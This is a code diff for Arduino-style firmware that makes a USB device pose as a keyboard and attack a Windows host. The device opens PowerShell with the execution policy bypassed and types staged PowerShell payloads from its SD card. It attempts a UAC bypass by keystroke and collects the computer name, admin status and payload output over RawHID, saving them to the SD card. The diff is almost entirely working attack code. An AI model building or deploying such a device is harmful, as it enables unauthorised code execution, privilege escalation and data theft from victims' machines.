@@ -53,7 +53,7 @@ void wait_for_drivers(unsigned int speed)
 }
 
 
-void panic() { //not expected to return, signals error and locks processor
+void panic() {  //does not return, locks processor and blinks slowly
 	Serial1.println("PANIC!");
 	while(true){
 		digitalWrite(LED_BUILTIN,HIGH);
@@ -91,14 +91,38 @@ inline char* padmessage(const char* msg){ //this WILL truncate messages longer t
 	}
 	return outmsg;
 }
+inline char* unpadmessage(const char* msg){
+	int x = strlen(msg);
+	if(x>64){
+		x=64; //prevent malformed messages from smashing things
+	}
+	char* out = (char*)malloc(x+1);
+	strncpy(out,msg,x); //copy to new buffer
+	out[x]=0x00; //add external null terminate to avoid overruns
+	return out;
+}
+inline char* unpadmessage(char* buf, const char* msg, int len){
+	if (len > 64){
+		len=64; //prevent overread
+	}
+	return strncpy(buf,msg,len);
+}
 char* rawhid_blocking_rcv(){
 	char* msg = new char[64];
-	while (!RawHID.available()){ //loop if there isn't a message
-		if (RawHID.recv(msg, 0) > 0){
-			break; //if we got a message, return.
-		}
+	while (RawHID.recv(msg, 0) > 0){ //loop if there isn't a message
+		yield();
 	}
 	return msg;
+}
+int rcv_message(void* buf, uint16_t timeout){
+	int x = RawHID.recv(buf,timeout);
+	if(x>0){
+		return x;
+	} else{
+		Serial1.println("Timeout!");
+		panic();
+		return 0; //stop complaining, gcc.
+	}
 }
 void setup() {
 	delay(100); //delay 100ms, makes it work for some reason
@@ -108,17 +132,6 @@ void setup() {
 	digitalWrite(LED_BUILTIN, HIGH);
 	delay(500);
 	digitalWrite(LED_BUILTIN, LOW);
-	Serial1.println("USB Serial Init...");
-	Serial.begin(115200);
-	Serial1.print("USB Serial Starting...");
-	while(!Serial){
-		digitalWrite(LED_BUILTIN, HIGH);
-		Serial1.print(".");
-		delay(100); //wait for USB serial to init
-		digitalWrite(LED_BUILTIN,LOW);
-		delay(100); //blink until serial init
-	}
-	Serial1.println("\nUSB Serial Ready.");
 	Serial1.println("Starting SD!");
 	if(!SD.begin(cs)){
 		Serial1.println("SD ERR");
@@ -127,10 +140,11 @@ void setup() {
 	Serial1.println("SD Started!");
 	wait_for_drivers(100); //probe numlock with 100ms delay
 	bool capsTrap = is_caps_on();
-	Serial1.println("CapsTrap Active.");
-	while(!capsTrap == is_caps_on()){ //TODO: actually make this work, it falls right through
-		blink_fast(2,100); //check every 200ms for if scroll lock changed, that's our signal to go
+	Serial1.println("CapsTrap Active."); //press capslock to run
+	while(capsTrap == is_caps_on()){
+		blink_fast(2,100); //check every 200ms for if caps lock changed, that's our signal to go
 	}
+	delay(50); //give a chance for caps to settle from the actual keyboard
 	if (is_caps_on()){
 			Keyboard.set_key1(KEY_CAPS_LOCK);
 			Keyboard.send_now();
@@ -141,34 +155,37 @@ void setup() {
 	Serial1.println("Parsing Config...");
 	readconfig();
 	Serial1.println("Config Parsed. Firing now...");
-	RawHID.send(padmessage("Starting RawHID"),64);
-	char* msg = rawhid_blocking_rcv(); //note that the host WILL need to be running a test script to send something
-	Serial1.println(msg); //print the RawHID message
 	startPowershell();
+	typeFile("stage0.ps1"); //type the initial stager, use RawHID to transfer everything else
 	Payload* functions = new Payload("functions.ps1");
 	functions->fire(); //we use this again, so don't free it
 	Payload* stager = new Payload("stager.ps1");
 	stager->fire(); //fire stager
-	char init[5];
-	readline(init, 5, &Serial);
-	if(strcmp(init,"init")){
-		Serial.println("ack");
-	} else {
-		panic(); //Didn't get init from stager!
+	char init[5] = {0};
+	void* buf[65] = {0}; //add trailing null so strlen doesn't puke
+	if(RawHID.recv(buf,20000) >0){ //possibly increase this if it's too short? it will return a packet is received anyways
+		Serial1.println("ERR: Didn't recive init from stager!\nAssuming stager didn't execute properly");
+		panic();
 	}
-	char pcname[16];
-	readline(pcname, 16, &Serial);
-	char comport[6];
-	readline(comport, 6, &Serial);
+	unpadmessage(init,(const char*)buf,4); //stop and wait for init
+	if(strcmp(init,"init")){
+		RawHID.send(padmessage("ack"),20000); //will return if the message is ready to be sent
+	} else {
+		Serial1.println("ERR: init magic was incorrect!");
+		panic(); //Didn't get proper init from stager!
+	}
+	char pcname[16] = {0};
+	rcv_message(buf,20000);
+	unpadmessage(pcname, (const char*) buf, 16);
 //	char* uacstatus = (char*)malloc();
 //	readline(uacstatus, , *Serial);  //TODO: parse return of this function and figure out how to bypass
-	char adminstatus[6];
-	readline(adminstatus, 6, &Serial);
+	char adminstatus[6] = {0};
+	rcv_message(buf,20000);
+	unpadmessage(adminstatus, (const char*) buf, 5);
 	if (strcmp(adminstatus, "False")){
-//		prepsecondstage((char*)secondstage_ps1, secondstage_ps1_len, comport); //tell stager the COM port to use
-		UACBypass("psadmin.ps1");
-		functions->fire(); //add the functions to the new PS session
-		Payload* smallstage = new Payload("smallstager.ps1", comport); //give small stager a COM port to work with
+		UACBypass("psadmin.ps1"); //starts new PS shell as admin, and attempts to alt-y through UAC
+		functions->fire(); //add the HID functions to the new PS session
+		Payload* smallstage = new Payload("smallstager.ps1");
 		smallstage->fire();
 	}
 	for(int i = 0; i<payloadc; i++){
@@ -177,12 +194,6 @@ void setup() {
 		payload_rcv(payloads[i], pcname); //listen for returned value;
 	}
 
-}
-
-void prepsecondstage(char* stage, int len, char* comport){
-	char* offset=(stage+10); //skip $comport="
-	sprintf(offset, "%s5", comport);
-	offset[5]='"'; //replace the null terminator with closing parenthesis so deployment doesn't choke
 }
 
 void readconfig(){
@@ -195,9 +206,10 @@ void readconfig(){
 	while (run){
 		for(int i = 0; i<100; i++){
 			line[i]=conf.read();
-			Serial.print(line[i]);
+			Serial1.print(line[i]);
 			if (line[i] == '\r' || line[i] == '\n' || line[i]=='\0'){
 				line[i]= '\0';
+				Serial1.println(""); //terminate the debug output
 				if(i==0 && line[i]== '\0'){
 					goto breakloop; //end of the config file, stop the parseloop
 				}
@@ -213,7 +225,7 @@ void readconfig(){
 				break;
 			}
 			if(line[i]=='\0'){
-				load->doesreturn(false);//config implies function does not return.
+				load->doesreturn(false);//config implies function does not return data.
 				if(i == 0){ //first byte of line is a null byte
 					run=false; //out of config
 					goto breakloop;
@@ -290,19 +302,19 @@ void payload_rcv(Payload* load, const char* pcname){
 	strcat(filename, load->getext());
 	char* magic = (char*)malloc(sizeof(load->getmagic()+6)); //add 6 bytes for _START or _END
 	sprintf(magic, "%s_START", load->getmagic());
-	char buf[101];
-	readline(buf, 101, &Serial);
+	char buf[65] = {0};
+	rcv_message(buf,20000);
 	if (!strcmp(buf, magic)){
 		panic(); //magic recieved didn't match
 	}
-	sprintf(magic, "%s_END", load->getmagic());//we clobber the magic string
+	sprintf(magic, "%s_END", load->getmagic());//we clobber the magic string to
 	File outfile = SD.open(filename, O_RDWR); //we want read/write
 	while (true){
-		readline(buf, 101, &Serial);
+		rcv_message(buf,20000); //the buffer is large enough and padded with nulls, no need to unpad
 		if (strcmp(buf, magic)){
 			break; //end magic recived
 		}
-		outfile.print(buf); //doesn't care that buf is comparativley huge
+		outfile.print(buf); //doesn't care that buf is huge compared to the string
 	}
 	outfile.close();
 	free(magic);
@@ -323,7 +335,7 @@ void hash_rcv(char* filename){
 	free(buffer); //we won't be using this anymore
 }
 
-void loop() {
+void loop() { //falls to this when done
 	digitalWrite(LED_BUILTIN, HIGH);
 	delay(2000);
 	digitalWrite(LED_BUILTIN, LOW);
@@ -344,8 +356,19 @@ void startPowershell(){
 	Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
 	Keyboard.println("%PWRSHLXDD% -ExecutionPolicy Bypass"); //pick powershell appropriate to target arch
 	delay(500); //wait for PS window
-	loop(); //blink
 }
 void echoPayload(char* load, int len){
 	Keyboard.println(load); //use println to hit enter for us
+}
+void typeFile(const char* filename){ //fire a payload to stage0
+		File load = SD.open(filename); //it assumes readonly, which we're fine with
+		int buffill; //length of data in buffer
+		char loadbuf[65] = {0};//add extra null for print.
+		buffill = load.read(loadbuf, 64); //fill the buffer
+		while(buffill>0){ //loop again file if the last read returned any data
+			Keyboard.write(loadbuf, buffill); //pass buffer to keyboard, with length of data in buffer
+			buffill = load.read(loadbuf, 64); //does the file have more data for us?
+		}
+		Keyboard.println(""); //append a last enter in case the file doesn't have one
+		load.close(); //make sure we close the file so SdFat can be used again
 }
